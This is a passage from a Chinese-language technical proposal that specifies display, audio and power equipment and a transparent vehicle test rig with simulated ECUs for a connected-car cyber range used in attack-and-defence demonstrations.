文档(OCR)_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/300379c4cfd5de3e319f72585f9f6eb2.jpeg" alt="新建 DOCX 文档(OCR)_06"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1631d834ba3495a9fe5f066be5cddb57.jpeg" alt="新建 DOCX 文档(OCR)_07"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d90fc66c41f6be54b62ecc20ad28f0ad.jpeg" alt="新建 DOCX 文档(OCR)_08"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4dd641d8d0cea8b87d3487dbb920c3a6.jpeg" alt="新建 DOCX 文档(OCR)_09"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/76eae6bd6b8a0dc387e43fd570e06d2b.jpeg" alt="新建 DOCX 文档(OCR)_10"></p><h5 id="产品彩页"><a href="#产品彩页" class="headerlink" title="产品彩页"></a>产品彩页</h5><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e54651a92683a8f4b6e7d745eb2018c9.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a8931670c1be6e80df61cf1026b47284.png"></p><h3 id="LED发送盒"><a href="#LED发送盒" class="headerlink" title="LED发送盒"></a>LED发送盒</h3><h4 id="产品概述-1"><a href="#产品概述-1" class="headerlink" title="产品概述"></a>产品概述</h4><p>LED发送盒选择山东泰克自研的产品。LED发送盒是LED显示屏系统中的一个重要组成部分，具有以下主要作用：</p><p>数据处理和控制：LED发送盒负责接收来自图像源（如计算机、视频处理器等）的数据信号，并对信号进行处理和解码。它将输入的图像数据转换为适合LED显示屏的控制信号，以控制LED模组的显示内容和亮度。</p><p>显示内容管理：LED发送盒具备显示内容管理的功能。通过连接到计算机或其他控制设备，发送盒可以接收和解析各种图像、视频和动画等内容，实现对LED显示屏上显示内容的控制和管理。它可以支持多种显示格式和分辨率，并具备灵活的显示内容切换和调整功能。</p><p>数据传输和分发：LED发送盒负责将处理后的控制信号传输给LED显示屏的各个模组。它通过数据传输接口（如以太网、光纤等）将控制信号传送到每个模组，确保各个模组按照统一的指令进行显示内容的呈现。发送盒还可以支持多种传输协议，如DMX、DVI、HDMI等，以适应不同的应用需求。</p><p>监控和诊断：LED发送盒通常具备监控和诊断功能，能够实时监测LED显示屏的工作状态和性能。它可以检测和报告LED模组的亮度、色彩均匀性、通信状态等信息，帮助用户及时发现和解决潜在问题，确保显示屏的正常运行。</p><p>系统集成和扩展：LED发送盒可以与其他控制设备和系统进行集成，如音频设备、触摸屏、传感器等。它可以通过接口扩展和连接外部设备，实现更多的功能和交互性，满足特定应用场景的需求。</p><h4 id="产品参数-1"><a href="#产品参数-1" class="headerlink" title="产品参数"></a>产品参数</h4><ol><li>输入分辨率支持高达1920×1200像素，用户可根据需要自定义设置分辨率，以适配不同的显示需求。</li><li>单个LED发送盒能够驱动最多230万像素的显示面积，横向最多可支持4096像素点，纵向最高可支持2560像素点。</li><li>设备配备配置6个千兆以太网输出端口和1个DVI输入端口，同时拥有双USB2.0接口，以便快速数据传输。</li><li>支持调整亮度和色温，以及在低亮度下保持高灰度输出，确保图像质量优异。</li></ol><h3 id="控制电脑"><a href="#控制电脑" class="headerlink" title="控制电脑"></a>控制电脑</h3><h4 id="产品概述-2"><a href="#产品概述-2" class="headerlink" title="产品概述"></a>产品概述</h4><p>控制电脑选用技嘉的JIJIA-08-TSJ电脑作为显示屏 。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cbe9fb0d8779aa1776f42368f0c3700f.png"></p><h4 id="产品参数-2"><a href="#产品参数-2" class="headerlink" title="产品参数"></a>产品参数</h4><ol><li>配置处理器I7-12700F；</li><li>配置16GB DDR4内存；</li><li>配置512GB SSD硬盘；</li><li>配置RTX3060Ti 8GB显卡。</li></ol><h3 id="管理软件"><a href="#管理软件" class="headerlink" title="管理软件"></a>管理软件</h3><h4 id="产品概述-3"><a href="#产品概述-3" class="headerlink" title="产品概述"></a>产品概述</h4><p>管理软件为山东泰克自研软件，LED显示屏中的管理软件负责管理和控制显示内容、亮度、播放模式等参数，实现远程控制、调度和监控，确保显示效果和运行稳定。</p><h4 id="产品参数-3"><a href="#产品参数-3" class="headerlink" title="产品参数"></a>产品参数</h4><ol><li>我司提供的LED显示屏幕控制软件，可运行于麒麟操作系统中。</li><li>我司提供的LED显示屏幕控制软件，支持显示屏亮色度快速采集校正软件。</li><li>我司提供的LED显示屏幕控制软件，支持LED显示屏专业维修软件。</li><li>我司提供的LED显示屏幕控制软件，支持播放软件。</li></ol><h3 id="视频拼接器参数要求"><a href="#视频拼接器参数要求" class="headerlink" title="视频拼接器参数要求"></a>视频拼接器参数要求</h3><h4 id="产品概述-4"><a href="#产品概述-4" class="headerlink" title="产品概述"></a>产品概述</h4><p>视频拼接器选用山东泰克自研产品，视频拼接器是一种设备，用于将多个视频信号源进行合并和切换，实现视频信号的拼接和切换，以便在显示屏上同时显示多个视频源或切换不同视频源的显示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/54670273a802063ef7e75121014207b9.png"></p><h4 id="功能参数如下："><a href="#功能参数如下：" class="headerlink" title="功能参数如下："></a>功能参数如下：</h4><ol><li>该视频拼接器配备28个HDMI2.0输入端口，其中4个端口支持4K高清输入，并具有28个输出通道，适用于复杂的视频拼接场景。</li><li>为了系统整体的高效运作，视频拼接器与LED显示屏需为统一品牌，确保技术兼容和稳定性。</li><li>设备附带正版授权的LED拼接软件，“拼接处理”软件著作权复印件如下。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0bd111cd433ebcbf052b6af95677407d.jpeg" alt="题-1"></p><ol><li>拼接器支持广泛的视频输入选项，包括但不限于HDMI、DVI、VGA、CVBS、SDI、IP和光纤输入，以满足各种输入需求。</li><li>设备提供多样的视频输出选择，支持HDMI、DVI、SDI和光纤等信号的输出，为不同输出需求提供灵活选择。</li><li>内置EDID编辑功能，允许用户自定义和优化显示设备的EDID信息，以获得最佳显示效果。</li><li>设备具备强大的图像处理功能，包括图像开窗、窗口叠加、窗口漫游、缩放以及字符叠加等。</li><li>支持场景的保存和快速读取，以及底图设置和图像截取等高级功能，提高用户操作便利性。</li><li>具有信号源预监功能，可以实时预览输入信号，确保输入源的正确性和效果。</li><li>设备设计了电源冗余备份机制，保障系统在电源异常时的稳定运行。</li><li>支持视频网络运维管理协议，能实时监控设备状态，并在发生异常时及时进行报警，保障系统安全稳定运行。</li></ol><h3 id="机柜参数要求"><a href="#机柜参数要求" class="headerlink" title="机柜参数要求"></a>机柜参数要求</h3><h4 id="产品概述-5"><a href="#产品概述-5" class="headerlink" title="产品概述:"></a>产品概述:</h4><p>机柜采用图腾的42U机柜。该机柜主要用于存放视频处理器及音响有关设备。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/06059f7f99a6f97e55f8c6528a1060c1.png"></p><h4 id="功能参数如下"><a href="#功能参数如下" class="headerlink" title="功能参数如下"></a>功能参数如下</h4><ol><li>提供42U标准机柜：用于安装各种标准尺寸的服务器、网络和通信设备。</li><li>材质：机柜采用优质冷轧钢材料制成，这种材料通常具有良好的强度和耐用性。使用脱脂静电喷塑工艺进行表面处理，可以提供一层保护性涂层，防止腐蚀、刮擦，并提供美观的外观。</li><li>满足防护等级IP20：可以保证机柜的防尘、防水能力。</li><li>附件：</li></ol><ul><li>提供固定支脚：为机柜提供稳定的站立能力，确保即使在装载重设备时也能保持稳定。</li><li>提供滚轮：使机柜便于移动，方便在数据中心等环境中进行布局调整或维护。</li><li>提供风扇：用于散热，确保机柜内部设备运行在适宜的温度下。</li><li>提供托盘：用于放置不能直接安装在机架上的设备，如小型服务器、键盘、鼠标等。</li><li>提供电源排插：提供多个电源插口，用于为机柜内的设备供电。</li></ul><h3 id="配电柜参数要求"><a href="#配电柜参数要求" class="headerlink" title="配电柜参数要求"></a>配电柜参数要求</h3><h4 id="产品概述-6"><a href="#产品概述-6" class="headerlink" title="产品概述"></a>产品概述</h4><p>配电柜选用正泰220V/380V挂式配电柜，该配电柜主要用于大屏及音响设备的电源分配及供电；</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/deb1bbef2296470d437e38e3239f6593.png"></p><h4 id="产品参数-4"><a href="#产品参数-4" class="headerlink" title="产品参数"></a>产品参数</h4><ol><li>我司提供功率30KW的配电柜，以保证配电柜能够管理和分配足够的电力，以满足连接到柜内的电气设备在不超过这个功率限制的情况下正常运行。</li><li>配电柜输入电压：380/220±10％。</li><li>配电柜支持帧频：50HZ。</li><li>配电柜支持手自动切换、本地和远程PLC控制的控制方式，同时还具备级联功能。</li><li>配电柜具备短路保护功能。</li><li>配电柜启动方式为延时启动。</li></ol><h3 id="钢架结构参数要求"><a href="#钢架结构参数要求" class="headerlink" title="钢架结构参数要求"></a>钢架结构参数要求</h3><h4 id="产品概述-7"><a href="#产品概述-7" class="headerlink" title="产品概述"></a>产品概述</h4><p>钢架结构为大屏的支撑固定材料，根据现场实施情况定制。</p><h4 id="产品参数-5"><a href="#产品参数-5" class="headerlink" title="产品参数"></a>产品参数</h4><ol><li>我司为显示屏安装选用的是钢架结构作为支撑，可以保证整体安全牢固。</li><li>材质根据甲方需求，采用定制化材料。</li></ol><h3 id="线阵列音柱参数要求"><a href="#线阵列音柱参数要求" class="headerlink" title="线阵列音柱参数要求"></a>线阵列音柱参数要求</h3><h4 id="产品概述-8"><a href="#产品概述-8" class="headerlink" title="产品概述"></a>产品概述</h4><p>线列阵音柱选用品牌为JBL，型号为CBT50LA-1的音柱，该音柱主要用于音响的外放扩大作用。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6e6d46b77ca286da214ee32a5c814193.png"></p><h4 id="产品参数-6"><a href="#产品参数-6" class="headerlink" title="产品参数"></a>产品参数</h4><ol><li>我司提供的线列阵音柱频响范围为低频下限低于等于75赫兹，高频上限高于等于19k赫兹；</li><li>我司提供的线列阵音柱频灵敏度（1瓦/1m）为98分贝；</li><li>我司提供的线列阵音柱频标称阻抗为于8 Ω；</li><li>我司提供的线列阵音柱频额定功率（AES）为600瓦；</li><li>我司提供的线列阵音柱频低音单元口径4×6.5寸 钕磁低音单元；2×1.4寸 钕磁高音单元；</li><li>我司提供的线列阵音柱频连续最大声压级 125分贝，峰值最大声压级131分贝；</li><li>我司提供的线列阵音柱频的标称覆盖角为水平110度，垂直23度。</li></ol><h3 id="多功能商用功率放大器参数要求"><a href="#多功能商用功率放大器参数要求" class="headerlink" title="多功能商用功率放大器参数要求"></a>多功能商用功率放大器参数要求</h3><h4 id="产品概述-9"><a href="#产品概述-9" class="headerlink" title="产品概述"></a>产品概述</h4><p>多功能商用放大器选用品伊乐浦，型号为MA-2700的多功能商用功率放大器，多功能商用放大器是一种设备，具备音频和视频信号放大、切换、混合、分配等功能，可用于商业场所的音视频系统，实现信号处理和多路输出，提供高质量的音视频体验。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/144c052d4d91131d35c9929dffe80562.png"></p><h5 id="产品参数-7"><a href="#产品参数-7" class="headerlink" title="产品参数"></a>产品参数</h5><ol><li>多功能商用放大器采用三级H类线路设计，高效体积小；采用大量高精度的SMD器件，自动化生产工艺，产品可靠性更高；放大器采用高效率的环形变压器，具备磁屏蔽层，有效抗干扰；放大器内置了自动变速风扇，优化的散热系统，使得机器性能更稳定；</li><li>多功能商用放大器每通道输出功率为950瓦@8Ω；</li><li>多功能商用放大器每通道输出功率为1350瓦@4Ω；</li><li>多功能商用放大器桥接功率输出功率为2700瓦@8Ω；</li><li>多功能商用放大器频率响应范围优于20赫兹-20k赫兹(±1分贝)；</li><li>多功能商用放大器总谐波失真低于0.1%；</li><li>多功能商用放大器阻尼系数220:1；</li><li>多功能商用放大器转换速率35伏/us；</li><li>多功能商用放大器电压放大倍数110；</li><li>多功能商用放大器信噪比100分贝（A计权）；</li><li>多功能商用放大器分离度60分贝；输入共模抑制比60分贝；</li><li>多功能商用放大器前面板指示，分别为保护指示灯、削波指示灯、信号指示灯。</li></ol><h4 id="无线手持话筒参数要求"><a href="#无线手持话筒参数要求" class="headerlink" title="无线手持话筒参数要求"></a>无线手持话筒参数要求</h4><h5 id="产品概述-10"><a href="#产品概述-10" class="headerlink" title="产品概述"></a>产品概述</h5><p>无线手持话筒选用品牌为宝麦风 ，型号为BM-777的产品，该产品具备稳定的声音录入及输出质量，保障声音的还原度及清晰度。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4236bf5ac480df1d11a4f564a152b14f.png"></p><h5 id="产品参数-8"><a href="#产品参数-8" class="headerlink" title="产品参数"></a>产品参数</h5><ol><li>无线手持话筒射频载波范围(UHF)：603~ 935MHZ；</li><li>无线手持话筒振荡方式：PLL锁相环合成；</li><li>无线手持话筒工作距离：理想条件下90M；</li><li>无线手持话筒搜频设置：内置传输频率搜索功能；</li><li>无线手持话筒制式：FM调频；</li><li>无线手持话筒预设通道：32；</li><li>无线手持话筒频响范围：100HZ ~ 10KHZ(±3dB)；</li><li>无线手持话筒频带宽度：120MHZ；</li><li>无线手持话筒系统失真/THD总谐波失真：&lt; 5@1KHZ%；</li><li>无线手持话筒信噪比：&gt; 50dB（A）；</li><li>无线手持话筒电源使用电压范围为100-240V；</li><li>无线手持话筒工作温度范围：0-50 ℃； AC50/60HZ,10W。</li></ol><h4 id="音频处理器参数要求"><a href="#音频处理器参数要求" class="headerlink" title="音频处理器参数要求"></a>音频处理器参数要求</h4><h5 id="产品概述-11"><a href="#产品概述-11" class="headerlink" title="产品概述"></a>产品概述</h5><p>音频处理器选用品牌为山东泰克，型号为C8NL，音频处理器是一种设备，用于对音频信号进行处理和优化，包括均衡、压缩、混响、延迟等功能，以改善音频质量、增强声音效果，并满足不同场景和需求的音频处理和调整。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cb442847ec254f13277125ba8390b0c9.png"></p><h5 id="产品参数-9"><a href="#产品参数-9" class="headerlink" title="产品参数"></a>产品参数</h5><ol><li>音频处理器配置4路模拟平衡输入，2路AES/EBU数字输入；</li><li>音频处理器配置8路模拟平衡输出；</li><li>音频处理器最大输入电平：+23dBu；</li><li>音频处理器最大输出电平：+23dBu；</li><li>音频处理器频率响应：20Hz～20kHz（+/-0.5dB）；</li><li>音频处理器输入/输出动态范围：120 dB(A)；</li><li>音频处理器总谐波失真+噪声: 0.004%；</li><li>音频处理器采样率：96kHz；</li><li>音频处理器信噪比：101dB；</li><li>音频处理器A/D、D/A转换：64dit；</li><li>音频处理器均衡：每路输入和输出均有10段PEQ；</li><li>音频处理器滤波：FIR,Bell, High Shelf, Low Shelf, Notch, Allpass, Band Pass, High Pass, Low Pass ；</li><li>音频处理器每路输入延迟2000ms, 每路输出延迟50ms_x000b_；</li><li>音频处理器支持分频：Butterworth,Bessel,Linkwitz-Riley,12.18.24dB/octave；</li><li>音频处理器的控制接口有USB和以太网（RJ45），可通过连接 PC, MAC进行设置和实时监控；</li><li>音频处理器操作系统支持Windows／Mac；</li><li>音频处理器支持场景场景有250 组预设数据；</li><li>音频处理器电源：220-240V AC，50/60Hz。</li></ol><h4 id="调音台参数要求"><a href="#调音台参数要求" class="headerlink" title="调音台参数要求"></a>调音台参数要求</h4><h5 id="产品概述-12"><a href="#产品概述-12" class="headerlink" title="产品概述"></a>产品概述</h5><p>调音台选用品牌为山东泰克，型号为C3N20，调音台是一种音频控制设备，用于混合、调整和处理多个音频信号源，包括麦克风、乐器和音乐播放器等，实现音量控制、均衡、效果处理等，以达到理想的音频混音和调音效果。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/de1ff7e48976c82868bc2d72b2a6f082.png"></p><h5 id="产品参数-10"><a href="#产品参数-10" class="headerlink" title="产品参数"></a>产品参数</h5><ol><li>调音台带有33个马达推子（32通道+1主控）</li><li>调音台带有48条输入混音通道（40单声道+2立体声+2返送通道）</li><li>调音台带有20个AUX（8单声道+6立体声）+立体声+子母线</li><li>调音台带有8个带有Roll-out的DCA编组</li><li>调音台带有32个模拟XLR/TRS混合麦克风/线路输入+2个模拟RCA立体声线路输入</li><li>调音台带有16个模拟XLR输出</li><li>调音台带有34×34 USB2.0数字录音/回放+2×2 录音/回放通过USB存储设备</li><li>调音台带有1个支持NY64-D音频介面卡的扩展槽</li></ol><h3 id="配套辅材参数要求"><a href="#配套辅材参数要求" class="headerlink" title="配套辅材参数要求"></a>配套辅材参数要求</h3><h4 id="产品概述-13"><a href="#产品概述-13" class="headerlink" title="产品概述"></a>产品概述</h4><p>靶场攻防演练大屏辅材为定制型产品，根据现场实施情况进行选取；</p><h4 id="产品参数-11"><a href="#产品参数-11" class="headerlink" title="产品参数"></a>产品参数</h4><ol><li>我司提供的配套辅材包含屏体四周外装饰：不锈钢或铝合金型材；</li><li>我司提供的配套辅材包含主控电缆+网线线材：根据实际测量需要提供足够的电缆及网线；</li><li>我司提供的配套辅材包含配备固定支脚、滚轮、风扇、托盘、电源排插；</li><li>我司提供的配套辅材包含运输机调试安装：提供收货、现场安装、调试服务。</li></ol><h1 id="智能汽车网络靶场攻防演练车辆台架"><a href="#智能汽车网络靶场攻防演练车辆台架" class="headerlink" title="智能汽车网络靶场攻防演练车辆台架"></a>智能汽车网络靶场攻防演练车辆台架</h1><h2 id="总体概述-5"><a href="#总体概述-5" class="headerlink" title="总体概述"></a>总体概述</h2><p>智能汽车网络靶场攻防演练车辆台架应具备以下能力：模拟汽车真实运行、搭载仿真智能电子电器零部件，配合靶场实现高逼真的实车攻防效果展示。</p><p>智能汽车网络靶场攻防演练车辆台架包含实车台架、电子电器零部件、车端软件、仿真云平台。</p><h2 id="实车台架方案"><a href="#实车台架方案" class="headerlink" title="实车台架方案"></a>实车台架方案</h2><p>功能参数如下：</p><ol><li>我司提供的实车台架采用亚克力透明车模型，喷绘XXXX新能源标志；</li><li>我司提供的透明车模型全车采用方管焊接金属龙骨，整体打磨光滑，做防锈处理，车身亚克力热成型制作，车轮金属焊接加工，整体批原子灰打磨光滑，外观喷涂2K汽车漆，内部LED流水灯条控制电路模拟管道走向；</li><li>提供零部件电源接口；</li><li>支持设置光电装置，用于展示车内数据流量与攻击流量并可配置其开关；</li><li>支持配合数字钥匙在车内通过UI展示车门开关状态；</li><li>TBOX、车机主机、仪表主机、网关暴露调试接口；</li><li>车内电子电器零部件采用仿真件挂载，原零部件保留，车内12V系统能正常运行；</li><li>攻击效果联动车联网安全运营中心，并在攻防演示大屏上展示响应攻击检测。</li></ol><h3 id="方案-2"><a href="#方案-2" class="headerlink" title="方案"></a>方案</h3><p>实车台架是一种用于展示和测试车辆的特殊设备，我司提供的车模型具有一个亚克力透明车身，使观察者可以清晰地看到车辆内部的结构和工作原理。</p><p>实车台架是用于展示和演示车辆相关技术和功能的装置，为了满足展示需求并提供良好的用户体验，我们设计了一套实车台架方案。该方案采用亚克力透明车模型，配备全车金属龙骨结构和亚克力热成型车身，具备防锈处理和外观喷涂等特点。此外，方案支持各种功能和参数要求，包括光电装置、数字钥匙展示、接口配置等。</p><p>亚克力透明车身是由高透明度的亚克力材料制成，它具有优异的光学性能，可以提供清晰的视野。这种车身材料不仅具有良好的耐用性和抗冲击性，还能够有效地防止紫外线和其他外部因素对车辆内部的影响。</p><p>实车台架的亚克力透明车身为观察者提供了独特的视角，使他们能够直观地了解车辆的内部构造和各个部件的工作原理。观察者可以清楚地看到发动机、传动系统、悬挂装置、制动系统等关键部件的工作状态和相互之间的配合。</p><p>通过实车台架，观察者可以更好地理解车辆的工作原理和性能特点。他们可以观察到发动机的燃烧过程、传动系统的工作方式、悬挂装置的运动轨迹等。这对于学习和教育、技术培训以及产品展示都具有重要意义。</p><p>实车台架的亚克力透明车身可以用于测试和调试车辆。通过观察车辆内部的运动和相互作用，工程师和技术人员可以更准确地识别和解决问题，提高车辆的性能和可靠性。</p><p>本方案采用的亚克力实车台架车体采用方管焊接金属龙骨，整体打磨光滑，做防锈处理，车身亚克力热成型制作，车轮金属焊接加工，整体批原子灰打磨光滑，外观喷涂2K汽车漆，内部LED流水灯条控制电路模拟管道走向，将TBOX、车机主机、仪表主机、网关等关键部位暴露调试接口，配合演示场景可进行光电效果展示，攻击行为联动车联网安全运营中心，并在攻防演示大屏上展示响应攻击检测。</p><p>实车台架主要包括以下内容：</p><p>实车台架采用亚克力透明车模型，喷绘XXXX新能源标志，具有高透明度和良好的展示效果。</p><p>全车采用方管焊接金属龙骨，经过整体打磨光滑处理，并进行防锈处理，确保结构牢固和使用寿命。</p><p>车身采用亚克力热成型制作，具备坚固、透明的特点，能够清晰显示车内部分结构和零部件。</p><p>车轮采用金属焊接加工，整体批原子灰打磨光滑，外观喷涂2K汽车漆，提供细腻的表面质感和真实感。</p><p>内部配置LED流水灯条控制电路模拟管道走向，能够展示车辆内部数据流量和攻击流量，具备良好的视觉效果。</p><p>提供零部件电源接口，方便连接和供电各种电子零部件，确保其正常运行。</p><p>支持设置光电装置，用于展示车内数据流量和攻击流量，并可根据需求配置开关，方便进行展示和演示。</p><p>支持配合数字钥匙在车内通过UI展示车门开关状态，能够直观地展示车辆的安全功能。</p><p>TBOX、车机主机、仪表主机、网关暴露调试接口，方便连接和调试相关设备，确保其正常运行。</p><p>车内电子电器零部件采用仿真件挂载，同时保留原零部件，确保车内12V系统能够正常运行。</p><p>攻击效果能够联动车联网安全运营中心，并在攻防演示大屏上展示响应攻击检测的结果，提供真实的演示效果。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5781b5ee6893d53b0ad17944030bdb9b.png"></p><h2 id="电子电器零部件方案"><a href="#电子电器零部件方案" class="headerlink" title="电子电器零部件方案"></a>电子电器零部件方案</h2><p>功能参数如下：</p><ol><li>支持主流的仿真车零部件：车机、TBOX、网关和仪表。</li><li>总线协议：支持CAN2.0总线，速率500k/s，CAN、车载以太网报文模拟发送/解析；支持CAN FD升级扩展。</li><li>车机：支持MCU 处理器168MHz及以上，RAM 192KB，Flash 1M；支持单核Cortex A7 MPU ， 512M RAM， 8G ROM，支持32G SD卡扩展；800x480 分辨率触控屏幕，满足业务系统人机交互需求；支持2路CAN，2路100M ETH通信接口；功能支持UDS诊断、电源管理、CAN报文处理等；MCU支持UDS远程升级，MPU支持A/B分区升级，支持MPU升级MCU。</li><li>TBOX：支持4G或有线方式连接外部网络，自动管理连接、断网自动重连等；MPU单核Cortex A7，512M RAM，8G ROM，支持32G或以上SD卡扩展，Linux系统； MCU，主频 168MHz，RAM 192KB，Flash 1M；支持1路CAN，2路100M以太网通信接口；ECU基础功能实现，如UDS诊断、电源管理、CAN报文处理等；MCU支持UDS远程升级，MPU支持A/B分区升级，支持MPU升级MCU。</li><li>网关：MCU，主频168MHz，RAM192KB，Flash1M；支持报文及信号路由，支持诊断防火墙功能；ECU基础功能实现，如UDS诊断、电源管理、CAN报文处理等；MCU支持UDS远程升级，MPU支持A/B分区升级，支持MPU升级MCU。</li><li>仪表：MCU，主频168MHz，RAM 192KB，Flash 1M；MPU，单核Cortex A7，512M RAM，8G ROM，支持32G SD卡扩展，Linux系统；7寸800x480分辨率或更高分辨率屏幕，显示车辆实时状态，如车速、档位、门窗状态、故障状态等信息；ECU基础功能实现，如UDS诊断、电源管理、CAN报文处理等；MCU支持UDS远程升级，MPU支持A/B分区升级，支持MPU升级MCU；</li><li>数字钥匙：MCU，主频 48MHz，RAM20KB，Flash 35KB；蓝牙连接的距离：20m；被动进入区域：0～3m；被动启动区域：车内空间覆盖率90%（驾驶员与副驾驶原区域全部覆盖），车外溢出＜20cm； 自动解锁的距离：可调；远离上锁的距离：可调；迎宾区域识别：可调</li><li>支持与仿真云平台的通信，为攻防演示提供测试环境；</li><li>支持扩展远程诊断等智能网联业务功能。</li></ol><h3 id="方案-3"><a href="#方案-3" class="headerlink" title="方案"></a>方案</h3><p>电子电器零部件虚拟化技术是一种将实际的电子电器零部件通过虚拟化技术模拟和仿真的方法。它可以在计算机系统中创建虚拟的电子电路和设备，以实现对电子电器系统的模拟和测试。</p><p>电子电器零部件虚拟化技术的主要目的是提供一种便捷、高效和经济的方法，用于设计、开发和测试电子电器系统。通过虚拟化技术，可以在计算机环境中快速搭建和模拟电路，并进行各种测试和分析，而无需实际的硬件零部件。</p><p>这项技术的核心是建立虚拟的电子电器模型，包括各种电子元件、电路板、传感器、执行器等。这些虚拟模型可以在计算机系统中进行仿真和测试，以验证设计的正确性、性能和可靠性。</p><p>1. 概述</p><p>本技术方案旨在设计一套智能网联车辆仿真台架系统，该系统将集成主流的仿真车零部件，支持高级通信协议和数据处理功能，以实现复杂的车辆通信和智能网联业务仿真。</p><p>2. 主要零部件支持</p><p>车机: 采用高性能MCU处理器和Cortex A7 MPU，实现复杂的数据处理和人机交互。</p><p>TBOX: 提供网络连接和车辆数据管理功能，支持4G和有线网络。</p><p>网关: 实现车辆内部通信的中转和安全管理。</p><p>仪表: 显示车辆实时状态和各类驾驶信息。</p><p>数字钥匙: 实现无钥匙进入和启动功能，支持蓝牙连接。</p><p>3. 总线协议</p><p>支持CAN2.0总线，速率500k/s，实现CAN、车载以太网报文的模拟发送和解析。</p><p>支持CAN FD协议，为未来的升级和扩展提供可能。</p><p>4. 详细零部件参数</p><p>车机:</p><p>MCU处理器168MHz及以上，RAM 192KB，Flash 1M。</p><p>单核Cortex A7 MPU，512M RAM，8G ROM，支持32G SD卡扩展。</p><p>800x480分辨率触控屏，满足人机交互需求。</p><p>2路CAN，2路100M ETH通信接口。</p><p>支持UDS诊断、电源管理、CAN报文处理等功能。</p><p>MCU和MPU支持远程升级。</p><p>TBOX:</p><p>MPU单核Cortex A7，512M RAM，8G ROM，支持32G以上SD卡扩展，运行Linux系统。</p><p>MCU主频168MHz，RAM 192KB，Flash 1M。</p><p>1路CAN，2路100M以太网通信接口。</p><p>实现ECU基础功能，支持UDS远程升级和MPU升级MCU。</p><p>网关:</p><p>MCU主频168MHz，RAM192KB，Flash1M。</p><p>支持报文及信号路由，诊断防火墙功能。</p><p>实现ECU基础功能，支持远程升级。</p><p>仪表:</p><p>MCU主频168MHz，RAM 192KB，Flash 1M。</p><p>MPU单核Cortex A7，512M RAM，8G ROM，支持32G SD卡扩展，运行Linux系统。</p><p>7寸800x480或更高分辨率屏幕，显示车辆状态信息。</p><p>实现ECU基础功能，支持远程升级。</p><p>数字钥匙:</p><p>MCU主频 48MHz，RAM20KB，Flash 35KB。</p><p>蓝牙连接距离20m，被动进入区域0～3m。</p><p>车内空间覆盖率90%，车外溢出＜20cm。</p><p>自动解锁和远离上锁距离可调，迎宾区域识别可调。</p><p>5. 仿真云平台通信</p><p>系统将支持与仿真云平台的通信，为攻防演示和测试提供环境。</p><p>6. 智能网联业务功能扩展</p><p>系统将支持扩展远程诊断等智能网联业务功能，以适应未来车辆通信和服务的发展。</p><p>7. 技术路线图</p><p>完成基础车辆通信和ECU功能的仿真。</p><p>实现与仿真云平台的通信，进行攻防演示。</p><p>扩展智能网联业务功能，提供远程诊断和其他高级服务。</p><p>电子电器零部件虚拟化技术具有以下优势：</p><p>节省成本：通过虚拟化技术，可以减少对实际硬件的需求，从而降低开发和测试的成本。不再需要大量的物理硬件进行测试和验证，而是通过虚拟模型进行仿真，节省了成本和资源。</p><p>提高效率：虚拟化技术可以快速创建和修改电子电器系统的模型，在计算机环境中进行仿真和测试。这大大缩短了设计和开发周期，提高了工作效率。</p><p>灵活性和可重复性：虚拟化技术可以轻松地修改和调整电子电器系统的参数和配置，以满足不同的需求和场景。同时，虚拟模型可以保存和复制，实现对设计和测试过程的可重复使用。</p><p>风险管理：通过虚拟化技术，在实际制造之前，可以对电子电器系统进行全面的仿真和测试，以发现潜在的问题和风险。这有助于提前识别和解决问题，降低产品开发和生产的风险。</p><p>总的来说，电子电器零部件虚拟化技术为电子电器系统的设计、开发和测试提供了一种高效、灵活和经济的方法。它可以加快产品上市时间，降低开发成本，并提高产品的可靠性和性能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b190af2c65ff446d21b49af592efa464.png"></p><h2 id="车端软件方案"><a href="#车端软件方案" class="headerlink" title="车端软件方案"></a>车端软件方案</h2><p>功能参数如下：</p><ol><li><p>远程升级模块参数如下：</p><p>支持升级包下载存储管理；</p><p>支持升级流程执行，对车内ECU的升级控制；</p><p>支持升级包解密和验签工作；</p><p>支持升级包反差分工作；</p><p>支持升级状态日志的记录与上报；</p></li><li><p>数字钥匙模块参数如下：</p></li></ol><p>多协议支持的数字钥匙方案（ICCE及私有协议）。</p><p>提供基于蓝牙RSSI的单模块及多模块定位技术。</p><p>提供近场安全通信能力。</p><p>不依赖于底层硬件平台的软件设计，便于快速部署多种车型平台。</p><p>整体方案性能优化，系统资源开销小。</p><p>基于ASPICE流程体系开发，可靠性高，稳定的蓝牙连接。</p><ol><li>车端集成认证管理、钥匙管理、定位计算、蓝牙安全通信、密码模块、安全芯片和天线模块七大功能：</li></ol><p>认证管理：提供基于不同数字钥匙协议的认证服务。包括基于不同数字钥匙协议的身份认证。</p><p>钥匙管理：提供基于不同数字钥匙协议的钥匙全生命周期管理服务。实现不同数字钥匙协议的具体应用。</p><p>定位计算：实现基于BLE的